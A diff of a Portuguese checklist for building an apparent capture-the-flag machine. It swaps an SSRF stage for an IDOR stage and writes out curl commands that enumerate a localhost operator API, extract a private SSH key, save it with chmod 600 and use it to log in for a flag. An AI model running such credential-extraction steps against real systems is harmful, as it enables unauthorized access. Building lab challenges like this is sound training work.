@@ -49,21 +49,40 @@ python3 test_app_client.py    # camada 2: Flask app.test_client(), sem rede/cont
 
 ## Etapa 2 — Pivot até o painel
 
-- [ ] `ss -tulpn` a partir do shell em `ru_web`, confirmar porta `8081` só em
+- [ ] `ss -tulpn` a partir do shell em `ru_web`, confirmar portas `8081` e `9090` só em
       `127.0.0.1`.
 - [ ] (Opcional) Túnel: `ssh -L 8081:127.0.0.1:8081 ...` — a documentar o método exato
       de acesso ao shell inicial que viabiliza isso.
-- [ ] Acessar o painel e localizar o campo de endpoint de "Verificar integração com o
-      Sistema Acadêmico".
+- [ ] Acessar o painel e localizar o formulário "Consulta de Operadores / Turnos".
 
-## Etapa 3 — SSRF
+## Etapa 3 — IDOR
 
-- [ ] Confirmar porta `9090` só em `127.0.0.1` (não exposta externamente).
-- [ ] Submeter `endpoint=http://127.0.0.1:9090/admin/credenciais` no campo vulnerável
-      (via painel ou via `curl` direto do shell de `ru_web`).
-- [ ] Copiar a chave SSH privada retornada, salvar em arquivo local, `chmod 600`.
-- [ ] `ssh -p 2222 -i <arquivo-chave> operador_caixa@localhost`.
-- [ ] Ler `/home/operador_caixa/user.txt` (flag 2).
+Implementada. Validação manual da lógica (testada e confirmada via testes locais):
+
+- [x] Listar operadores da API interna:
+      `curl -s http://127.0.0.1:9090/api/v1/operadores | python3 -m json.tool`
+- [x] Enumerar operadores individualmente:
+      ```bash
+      curl -s http://127.0.0.1:9090/api/v1/operadores/1 | python3 -m json.tool
+      curl -s http://127.0.0.1:9090/api/v1/operadores/2 | python3 -m json.tool
+      curl -s http://127.0.0.1:9090/api/v1/operadores/3 | python3 -m json.tool
+      ```
+- [x] Confirmar que o operador ID 3 (`operador_caixa`) retorna chave SSH privada no
+      campo `chave_privada` (IDOR: sem controle de autorização).
+- [x] Extrair a chave para arquivo local com permissão correta:
+      ```bash
+      curl -s http://127.0.0.1:9090/api/v1/operadores/3 \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['chave_privada'])" \
+        > /tmp/operador_caixa.pem
+      chmod 600 /tmp/operador_caixa.pem
+      ```
+- [ ] Conectar via SSH: `ssh -p 2222 -i /tmp/operador_caixa.pem operador_caixa@localhost` (pendente setup do SSH na imagem).
+- [ ] Ler `/home/operador_caixa/user.txt` (flag 2 — pendente setup do usuário na imagem).
+
+Testes em camadas automatizados (todos passando ✅):
+
+- [x] `tests/test_idor_logica.py`: Camada 1 — admin-api como subprocesso real, valida listagem e extração de chave via IDOR.
+- [x] `tests/test_painel_client.py`: Camada 2 — Flask `test_client()` do painel + admin-api real, valida formulário de consulta e vazamento de credencial.
 
 ## Etapa 4 — Escalação de privilégio
 
